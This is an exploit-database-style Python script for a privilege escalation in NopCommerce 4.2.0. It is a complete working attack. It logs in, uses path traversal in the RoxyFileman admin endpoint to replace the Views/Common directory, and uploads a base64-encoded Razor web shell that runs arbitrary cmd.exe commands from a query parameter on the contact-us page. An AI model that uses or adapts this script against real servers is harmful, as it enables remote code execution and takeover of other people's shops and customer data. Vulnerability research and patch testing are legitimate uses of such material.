# Vulnerability Title: NopCommerce 4.2.0 - Plugin Privilege Escalation
# Author: Alessandro Magnosi (d3adc0de)
# Date: (DD/MM/YYYY) - 07/07/2019
# Vendor Homepage: https://www.nopcommerce.com/
# Software Link : https://www.nopcommerce.com/
# Tested Version: 4.2.0
# Vulnerability Type: Privilege Escalation
# Tested on OS: Windows 10, CentOS, Docker
# Exploit designed for: NopCommerce 4.2.0 on IIS

import argparse
import base64
import warnings

import requests
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')

def formatted_shell():
    b64_shell = b'LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0zMTI1MjYxOTI4NzYwDQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhd' \
                b'GE7IG5hbWU9ImFjdGlvbiINCg0KdXBsb2FkDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTMxMjUyNjE5Mjg3NjANCk' \
                b'NvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ibWV0aG9kIg0KDQphamF4DQotLS0tLS0tLS0tLS0tLS0tLS0' \
                b'tLS0tLS0tLS0tLTMxMjUyNjE5Mjg3NjANCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZCINCg0KL2lt' \
                b'YWdlcy91cGxvYWRlZC8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi9pbmV0cHViL3d3d3Jvb3Qvbm9wY29tbWVyY2UvV' \
                b'mlld3MvQ29tbW9uLw0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0zMTI1MjYxOTI4NzYwDQpDb250ZW50LURpc3Bvc2' \
                b'l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImZpbGVzW10iOyBmaWxlbmFtZT0iQ29udGFjdFVzLmNzaHRtbCINCkNvbnRlbnQtVHl' \
                b'wZTogaW1hZ2UvcG5nDQoNCkB1c2luZyBTeXN0ZW0NCkB1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3MNCg0KQHsgDQogICAgVmll' \
                b'd0RhdGFbIlRpdGxlIl0gPSAiTVZDIFNoM2xsIFdpbmRvd3MiOw0KICAgIHZhciByZXN1bHQgPSAiIjsNCiAgICB2YXIgY21kI' \
                b'D0gQ29udGV4dC5SZXF1ZXN0LlF1ZXJ5WyJjbWQiXTsNCiAgICBpZiAoIVN0cmluZy5Jc051bGxPckVtcHR5KGNtZCkpew0KIC' \
                b'AgICAgICByZXN1bHQgPSBCYXNoKGNtZCk7DQogICAgfQ0KDQogICAgaWYgKFN0cmluZy5Jc051bGxPckVtcHR5KHJlc3VsdCk' \
                b'pew0KICAgICAgICByZXN1bHQgPSAiSW52YWxpZCBjb21tYW5kIG9yIHNvbWV0aGluZyBkaWRuJ3Qgd29yayI7DQogICAgfQ0K' \
                b'DQp9DQoNCkBmdW5jdGlvbnN7DQogICAgcHVibGljIHN0YXRpYyBzdHJpbmcgQmFzaCAoc3RyaW5nIGNtZCkNCiAgICB7DQogI' \
                b'CAgICAgIHZhciByZXN1bHQgPSAiIjsNCiAgICAgICAgdmFyIGVzY2FwZWRBcmdzID0gY21kLlJlcGxhY2UoIlwiIiwgIlxcXC' \
                b'IiKTsNCiAgICAgICAgdmFyIHByb2Nlc3MgPSBuZXcgUHJvY2VzcygpDQogICAgICAgIHsNCiAgICAgICAgICAgIFN0YXJ0SW5' \
                b'mbyA9IG5ldyBQcm9jZXNzU3RhcnRJbmZvDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgRmlsZU5hbWUgPSAiY21k' \
                b'LmV4ZSIsDQogICAgICAgICAgICAgICAgQXJndW1lbnRzID0gJCIvQyBcIntlc2NhcGVkQXJnc31cIiIsDQogICAgICAgICAgI' \
                b'CAgICAgUmVkaXJlY3RTdGFuZGFyZE91dHB1dCA9IHRydWUsDQogICAgICAgICAgICAgICAgVXNlU2hlbGxFeGVjdXRlID0gZm' \
                b'Fsc2UsDQogICAgICAgICAgICAgICAgQ3JlYXRlTm9XaW5kb3cgPSB0cnVlLA0KICAgICAgICAgICAgfQ0KICAgICAgICB9Ow0' \
                b'KDQogICAgICAgIHByb2Nlc3MuU3RhcnQoKTsNCiAgICAgICAgcmVzdWx0ID0gcHJvY2Vzcy5TdGFuZGFyZE91dHB1dC5SZWFk' \
                b'VG9FbmQoKTsNCiAgICAgICAgcHJvY2Vzcy5XYWl0Rm9yRXhpdCgpOw0KDQogICAgICAgIHJldHVybiByZXN1bHQ7DQogICAgf' \
                b'Q0KfQ0KDQoNCg0KPHNjcmlwdA0KICBzcmM9Imh0dHBzOi8vY29kZS5qcXVlcnkuY29tL2pxdWVyeS0zLjIuMS5taW4uanMiDQ' \
                b'ogIGludGVncml0eT0ic2hhMjU2LWh3ZzRnc3hnRlpoT3NFRWFtZE9ZR0JmMTNGeVF1aVR3bEFRZ3hWU05ndDQ9Ig0KICBjcm9' \
                b'zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4NCjxzY3JpcHQ+DQokKGZ1bmN0aW9uKCkgew0KICAgIHZhciBjbWRSZXN1' \
                b'bHQgPSAkKCIjY21kUmVzdWx0Iik7DQoNCgljb25zb2xlLmxvZyhjbWRSZXN1bHQpOw0KDQoJaWYgKGNtZFJlc3VsdC50ZXh0K' \
                b'CkgPT09ICJJbnZhbGlkIGNvbW1hbmQgb3Igc29tZXRoaW5nIGRpZG4ndCB3b3JrIil7DQoJICAgIGNvbnNvbGUubG9nKCJzaG' \
                b'91bGQgY2hhbmdlIHRleHQiKTsNCiAgICAgICAgY21kUmVzdWx0LmNzcygiY29sb3IiLCAicmVkIik7DQoJfQ0KCQ0KCXZhciB' \
                b'0ZXJtID0gJCgiI2NvbnNvbGUiKTsNCiAgICAkKCIjY21kIikuZm9jdXMoKTsNCgl0ZXJtLnNjcm9sbFRvcCh0ZXJtLnByb3Ao' \
                b'InNjcm9sbEhlaWdodCIpKTsNCgkNCgkkLnVybFBhcmFtID0gZnVuY3Rpb24obmFtZSl7DQogICAgICAgIHZhciByZXN1bHRzI' \
                b'D0gbmV3IFJlZ0V4cCgnW1w/Jl0nICsgbmFtZSArICc9KFteJiNdKiknKS5leGVjKHdpbmRvdy5sb2NhdGlvbi5ocmVmKTsNCi' \
                b'AgICAgICAgaWYgKHJlc3VsdHM9PW51bGwpew0KICAgICAgICAgICByZXR1cm4gbnVsbDsNCiAgICAgICAgfQ0KICAgICAgICB' \
                b'lbHNlew0KICAgICAgICAgICByZXR1cm4gZGVjb2RlVVJJKHJlc3VsdHNbMV0pIHx8IDA7DQogICAgICAgIH0NCiAgICB9DQoN' \
                b'CgkNCglmdW5jdGlvbiBleGVjdXRlQ21kKCl7DQogICAgICAgIHZhciBjbWQgPSBlbmNvZGVVUklDb21wb25lbnQoJCgiI2NtZ' \
                b'CIpLnZhbCgpKTsNCgkgICAgdmFyIGN1cnJlbnRDbWQgPSAkLnVybFBhcmFtKCdjbWQnKTsNCgkgICAgY29uc29sZS5sb2coIn' \
                b'Nob3VsZCByZXBsYWNlOiAiICsgY3VycmVudENtZCArICIgV0lUSDogIiArIGNtZCk7DQoNCgkgICAgdmFyIGN1cnJlbnRVcmw' \
                b'gPSBsb2NhdGlvbi5ocmVmOw0KDQoJICAgIHZhciBwYXJhbURlbGltZXRlciA9ICIiOw0KCSAgICBpZiAoY3VycmVudFVybC5p' \
                b'bmRleE9mKCI/IikgPCAwKXsNCgkgICAgICAgIHBhcmFtRGVsaW1ldGVyID0gIj8iOw0KCSAgICB9IGVsc2Ugew0KCSAgICAgI' \
                b'CAgcGFyYW1EZWxpbWV0ZXIgPSAiJiI7DQoJICAgIH0NCiAgICAgICAgDQoJICAgIGlmIChjdXJyZW50VXJsLmluZGV4T2YoIm' \
                b'NtZD0iKSA8IDApew0KICAgICAgICAgICAgY3VycmVudFVybCA9IGxvY2F0aW9uLmhyZWYgKyBwYXJhbURlbGltZXRlciArICJ' \
                b'jbWQ9IjsNCgkgICAgfQ0KCQ0KICAgICAgICB2YXIgbmV3VXJsID0gY3VycmVudFVybC5yZXBsYWNlKC9jbWQ9LiovLCAiY21k' \
                b'PSIrY21kKTsNCiAgICAgICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSBuZXdVcmw7DQoNCgkgICAgLy9jb25zb2xlLmxvZyhuZ' \
                b'XdVcmwpOw0KCX0NCgkNCiAgICAkKCIjc3VibWl0Q29tbWFuZCIpLmNsaWNrKGZ1bmN0aW9uKCl7DQoJICAgIGV4ZWN1dGVDbW' \
                b'QoKTsNCgl9KQ0KDQoJJCgiI2NtZCIpLmtleXByZXNzKGZ1bmN0aW9uIChlKSB7DQoJICAgIGlmIChlLndoaWNoID09IDEzKSB' \
                b'7DQoJICAgICAgICBleGVjdXRlQ21kKCk7DQoJICAgICAgICByZXR1cm4gZmFsc2U7DQoJICAgIH0NCgl9KTsNCg0KCSQoIiNj' \
                b'bWQiKS5vbigiY2hhbmdlIHBhc3RlIGtleXVwIiwgZnVuY3Rpb24odGhlVmFsKXsNCgkgICAgdmFyIGNtZCA9ICQoIiNjbWQiK' \
                b'S52YWwoKTsNCgkgICAgJCgiI2NtZElucHV0IikudGV4dChjbWQpOw0KCX0pOw0KfSk7DQoNCjwvc2NyaXB0Pg0KDQoNCjxoMz' \
                b'5AVmlld0RhdGFbIlRpdGxlIl0uPC9oMz4NCjxoND5AVmlld0RhdGFbIk1lc3NhZ2UiXTwvaDQ+DQo8aDQ+T3V0cHV0IGZvcjo' \
                b'+IDxzcGFuIHN0eWxlPSJmb250LWZhbWlseTogbW9ub3NwYWNlOyBmb250LXdlaWdodDogbm9ybWFsOyI+QGNtZDwvc3Bhbj48' \
                b'L2g0Pg0KDQoNCjxwcmUgaWQ9ImNvbnNvbGUiIHN0eWxlPSJjb2xvcjogIzAwZmYwMDtiYWNrZ3JvdW5kLWNvbG9yOiAjMTQxN' \
                b'DE0O21heC1oZWlnaHQ6IDYwNnB4OyI+DQpDIzo+QGNtZA0KCQ0KPHNwYW4gaWQ9ImNtZFJlc3VsdCI+QHJlc3VsdDwvc3Bhbj' \
                b'4NCgkNCkMjOj48c3BhbiBpZD0iY21kSW5wdXQiPjwvc3Bhbj4NCjwvcHJlPg0KDQo8YnIgLz4NCg0KPHA+RW50ZXIgeW91ciB' \
                b'jb21tYW5kIGJlbG93OjwvcD4NCjxzcGFuIHN0eWxlPSJkaXNwbGF5OiBpbmxpbmUtZmxleCAhaW1wb3J0YW50OyI+DQogICAg' \
                b'PGlucHV0ICBpZD0iY21kIiBjbGFzcz0iZm9ybS1jb250cm9sIiB0eXBlPSJ0ZXh0IiBzdHlsZT0id2lkdGg6IDQwMHB4OyIgL' \
                b'z4gDQoJPGJ1dHRvbiBpZD0ic3VibWl0Q29tbWFuZCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSI+U2VuZCE8L2J1dHRvbj4NCj' \
                b'wvc3Bhbj4NCg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0zMTI1MjYxOTI4NzYwLS0='

    return base64.b64decode(b64_shell).decode()


def proxy(flag):
    return {"http": "http://127.0.0.1:9090", "https": "http://127.0.0.1:9090"} if flag else None


def geturl(baseurl, type):
    if type == "login":
        return baseurl + "/login"
    elif type == "mv":
        return baseurl + "/Admin/RoxyFileman/ProcessRequest?a=RENAMEDIR&d=%2fimages%2fuploaded%2f" + \
               "..%2F..%2F..%2F..%2F..%2F..%2F..%2Finetpub%2fwwwroot%2fnopcommerce%2fViews%2fCommon%2f&n=Common2"
    elif type == "mkdir":
        return baseurl + "/Admin/RoxyFileman/ProcessRequest?a=CREATEDIR&d=%2fimages%2fuploaded"\
                         "%2f..%2F..%2F..%2F..%2F..%2F..%2F..%2Finetpub%2fwwwroot%2fnopcommerce%2fViews%2f&n=Common"
    elif type == "put":
        return baseurl + "/Admin/RoxyFileman/ProcessRequest?a=UPLOAD"
    elif type == "contactus":
        return baseurl + "/contactus"
    else:
        return ""


def login(email, password, url, proxy):
    res = requests.get(geturl(url, "login"), proxies=proxy, verify=False, allow_redirects=False)
    cookie = res.cookies.get_dict()
    soup = BeautifulSoup(res.text, features="html.parser")
    token = soup.find("input", {"name": "__RequestVerificationToken"})["value"]
    res = requests.post(geturl(url, "login"), cookies=cookie,
                        data={"Email": email, "Password": password, "__RequestVerificationToken": token,
                              "RememberMe": "false"}, proxies=proxy, verify=False, allow_redirects=False)
    cookies = res.cookies.get_dict()
    return {**cookies, **cookie}


def shellupload(email, password, url, proxy):
    print("[+] Trying uploading shell from")
    cookies = login(email, password, url, proxy)
    # Rename Common Directory
    requests.get(geturl(url, "mv"), headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"}, proxies=proxy,
                 cookies=cookies, verify=False, allow_redirects=False)
    # Create Common Directory
    requests.get(geturl(url, "mkdir"), headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"}, proxies=proxy,
                 cookies=cookies, verify=False, allow_redirects=False)
    # Upload File into Common
    requests.post(geturl(url, "put"),
                  headers={"Content-Type": "multipart/form-data; boundary=---------------------------3125261928760",
                           "User-Agent": "Mozilla/5.0 Gecko/20100101 Firefox/67.0"},
                  data=formatted_shell(),
                  proxies=proxy, cookies=cookies, verify=False, allow_redirects=False)
    # Test if it is working
    res = requests.get(geturl(url, "contactus"), headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"}, proxies=proxy,
                       cookies=cookies, verify=False, allow_redirects=False)
    soup = BeautifulSoup(res.text, features="html.parser")
    test = soup.find("span", {"id": "cmdResult"})
    if test is None:
        print("[-] Maybe the target is not vulnerable, or you need to restart the appliance")
    else:
        print("[+] Shell uploaded under contact us page")


def main():
    parser = argparse.ArgumentParser(description='Upload a shell in NopCommerce')
    parser.add_argument(
        '-e', '--email', required=True, type=str, help='Username')
    parser.add_argument(
        '-p', '--password', required=True, type=str, help='Password')
    parser.add_argument(
        '-u', '--url', required=True, type=str, help='Base Url of NopCommerce')
    parser.add_argument(
        '-x', '--proxy', required=False, action="store_true", help='Proxy (for debugging)')

    args = parser.parse_args()

    shellupload(args.email, args.password, args.url, proxy(args.proxy))


if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    main()
